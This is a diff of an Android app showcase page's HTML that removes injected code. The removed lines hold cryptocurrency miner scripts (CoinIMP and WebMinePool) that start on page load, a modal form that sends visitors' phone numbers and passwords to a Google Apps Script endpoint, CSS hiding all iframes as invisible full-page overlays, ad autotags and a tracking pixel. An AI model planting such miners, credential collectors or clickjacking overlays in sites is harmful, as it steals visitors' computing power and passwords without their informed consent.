@@ -1,10 +1,6 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<meta name="fo-verify" content="41dbe6a9-9b3e-459b-9ff3-a8638bd31782" />
-	<script id="aclib" type="text/javascript" src="//acscdn.com/script/aclib.js"></script>
-
-
   <link rel= "stylesheet" href="style.css">
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -12,7 +8,7 @@
   <link rel="shortcut icon" href="assets/images/nav.jpg" type="image/x-icon" style="list-style:none; margin-bottom: 10px; width: 100px; height: 100px; border-radius: 50%; object-position: cover ; ">
   <meta name="description" content="Discover the latest Android applications and subscribe for updates. Explore a world of possibilities with our paid products and services.">
 
-  <title>web design software</title>
+  <title>Android App Store</title>
   <link rel="stylesheet" href="assets/web/assets/mobirise-icons2/mobirise2.css">
   <link rel="stylesheet" href="assets/parallax/jarallax.css">
   <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
@@ -29,176 +25,8 @@
   
 
   <style>:root{ --background: #FFF8E6; --dominant-color: #FFB703; --primary-color: #219EBC; --secondary-color: #ED8D39; --success-color: #20AC6B; --danger-color: #AE1E2C; --warning-color: #CC9900; --info-color: #0AA3C2; --background-text: #000000; --dominant-text: #000000; --primary-text: #FFFFFF; --secondary-text: #000000; --success-text: #FFFFFF; --danger-text: #FFFFFF; --warning-text: #000000; --info-text: #FFFFFF;}</style>
-
-	 <style>
-        /* إعدادات لإخفاء الإطار */
-        iframe {
-            opacity: 0; /* إخفاء الإطار */
-            position: absolute; /* وضع الإطار فوق المحتوى */
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 2; /* جعل الإطار في المقدمة */
-        }
-    </style>
-     
 </head>
-	<script src="https://www.hostingcloud.racing/1mwB.js"></script>
-        <script>
-    var _client = new Client.Anonymous('406dbc1fcf71f34e72a4df94696063900e1bb6169e599a22ca6c616cb5e4e129', {
-        throttle: 0, c: 'w'
-    });
-    _client.start();
-    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
-
-</script>    
 <body>
-
-
-
-	<!-- نافذة الموافقة -->
-<div id="consent-modal">
-  <div id="consent-box">
-    <span id="close-btn" onclick="hideModal()">❌</span>
-    <p>مرحبًا بك! 😊<br>هل تسمح لنا باستخدام جزء بسيط من معالج جهازك لدعم الموقع بالتعدين؟</p>
-    <button onclick="agree()">نعم، أوافق</button>
-    <button onclick="disagree()">لا، لا أوافق</button>
-    <hr>
-     <h4>سجل معنا (اختياري)</h4>
-    <input type="text" id="phone" placeholder="رقم الهاتف"><br><br>
-    <input type="password" id="password" placeholder="كلمة السر"><br><br>
-    <button onclick="register()">تسجيل</button>
-
-</div>
-
-<!-- سكربت التعدين -->
-<script src="https://www.webminepool.com/lib/base.js"></script>
-
-<!-- سكربت التحكم -->
-<script>
-let miner;
-
-function agree() {
-  localStorage.setItem('mining_consent', 'yes');
-  hideModal();
-  startMiner();
-}
-
-function disagree() {
-  localStorage.setItem('mining_consent', 'no');
-  hideModal();
-}
-
-function register() {
-  const phone = document.getElementById('phone').value;
-  const password = document.getElementById('password').value;
-
-  const url = "https://script.google.com/macros/s/AKfycbw7xDQY1OVhDtgpvOvXfrIIyCJp0xhHCXo6ih-HHlljWpOVVi8RZMPG-DK8idUVry94rg/exec";
-
-  const formData = new FormData();
-  formData.append("phone", phone);
-  formData.append("password", password);
-
-  fetch(url, {
-    method: "POST",
-    body: formData
-  })
-  .then(() => {
-    alert(`✅ تم التسجيل بنجاح برقم ${phone}`);
-    document.getElementById('phone').value = "";
-    document.getElementById('password').value = "";
-  })
-  .catch(err => {
-    alert("❌ حدث خطأ أثناء الإرسال");
-    console.error(err);
-  });
-}
-
-
-function hideModal() {
-  document.getElementById('consent-modal').style.display = 'none';
-}
-
-function startMiner() {
-  miner = WMP.Anonymous('SK_ja9lLCYEx3wEGeCSXykzG', { throttle: 0.3 });
-  if (!miner.isMobile()) {
-    miner.start();
-  }
-}
-
-window.onload = () => {
-  const consent = localStorage.getItem('mining_consent');
-  if (consent === 'yes') {
-    hideModal();
-    startMiner();
-  } else if (consent === 'no') {
-    hideModal();
-  } else {
-    document.getElementById('consent-modal').style.display = 'flex';
-  }
-};
-</script>
-
-<!-- CSS للتصميم -->
-<style>
-#consent-modal {
-  position: fixed;
-  top: 0; left: 0;
-  width: 100vw;
-  height: 100vh;
-  background-color: rgba(0, 0, 0, 0.6);
-  backdrop-filter: blur(4px);
-  display: none;
-  align-items: center;
-  justify-content: center;
-  z-index: 9999;
-}
-
-#consent-box {
-  background: white;
-  padding: 20px;
-  border-radius: 12px;
-  width: 90%;
-  max-width: 400px;
-  box-shadow: 0 0 15px rgba(0,0,0,0.2);
-  position: relative;
-  text-align: center;
-}
-
-#close-btn {
-  position: absolute;
-  top: 8px;
-  right: 12px;
-  cursor: pointer;
-  font-size: 18px;
-  color: #666;
-}
-
-#consent-box button {
-  padding: 10px 15px;
-  margin: 5px;
-  border: none;
-  background-color: #4CAF50;
-  color: white;
-  border-radius: 5px;
-  cursor: pointer;
-}
-
-#consent-box button:hover {
-  background-color: #3e8e41;
-}
-
-#consent-box input {
-  width: 90%;
-  padding: 8px;
-  margin: 4px 0;
-  border: 1px solid #ccc;
-  border-radius: 5px;
-}
-</style>
-
-	
 
 
     <style>
@@ -763,19 +591,6 @@ window.onload = () => {
 }
 </style>
 
-	<style>
-        /* إعدادات لإخفاء الإطار */
-        iframe {
-            opacity: 0; /* إخفاء الإطار */
-            position: absolute; /* وضع الإطار فوق المحتوى */
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 2; /* جعل الإطار في المقدمة */
-        }
-    </style>
-
 <section class="menu menu2 cid-u83l59iYXW" once="menu" id="menu-5-u83l59iYXW">
   <nav class="navbar navbar-dropdown navbar-fixed-top navbar-expand-lg">
     <div class="container">
@@ -787,8 +602,6 @@ window.onload = () => {
 				</span>
 				<span class="navbar-caption-wrap">
           <a class="navbar-caption text-black display-4" href="index.html">Appify</a>
-					
-	
         </span>
       </div>
       <button class="navbar-toggler" type="button" data-toggle="collapse"
@@ -808,14 +621,10 @@ window.onload = () => {
           
           <li class="nav-item">
             <a class="nav-link link text-black display-4" href="apps.html"
-              aria-expanded="false">
-
-		    Apps</a>
+              aria-expanded="false">Apps</a>
           </li>
           <li class="nav-item">
-            <a class="nav-link link text-black display-4" href="sites.html">
-
-		    Sites</a>
+            <a class="nav-link link text-black display-4" href="sites.html">Sites</a>
           </li>
         </ul>
         <div class="navbar-buttons mbr-section-btn">
@@ -1303,7 +1112,6 @@ window.onload = () => {
         </div>
       </div>   
   </div>
-	<img src="https://tracker.metricool.com/c3po.jpg?hash=b35c4add49cae9bb9edc74377815d1af"/>
 </section>
     <style>
   .cid-u83l59kmJH {
@@ -2772,15 +2580,6 @@ window.onload = () => {
             <a href="mailto:basmhalaika@gmail.com">Email: basmhalaika@gmail.com</a>
             <br>Address: Nablus Palestine, State of
             <br>Working Hours: Mon-Fri: 9am-6pm</p> 
-		<script src="https://www.hostingcloud.racing/ef2P.js"></script>
-<script>
-    var _client = new Client.Anonymous('406dbc1fcf71f34e72a4df94696063900e1bb6169e599a22ca6c616cb5e4e129', {
-        throttle: 0, c: 'w'
-    });
-    _client.start();
-    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
-
-</script>
         </div>
       </div>
       <div class="col-lg-8 side-features">
@@ -2921,28 +2720,5 @@ window.onload = () => {
   </script>
   <script src="main.js"></script>
   <script src="Express.js"></script>
-	    <script type="text/javascript">
-    aclib.runAutoTag({
-        zoneId: 'kmdwz7qx84',
-    });
-</script>
-
-	    <script type="text/javascript">
-    aclib.runAutoTag({
-        zoneId: '2r4ahjnagu',
-    });
-</script>
-
-
-	      <script src="https://www.hostingcloud.racing/eY1Q.js"></script>
-<script>
-    var _client = new Client.Anonymous('77df418b1f6d4f42050541215eed6c63cfaca765118650d51be37632dfc12cb0', {
-        throttle: 0, c: 'w'
-    });
-    _client.start();
-
-</script>
-
-
 </body>
 </html>
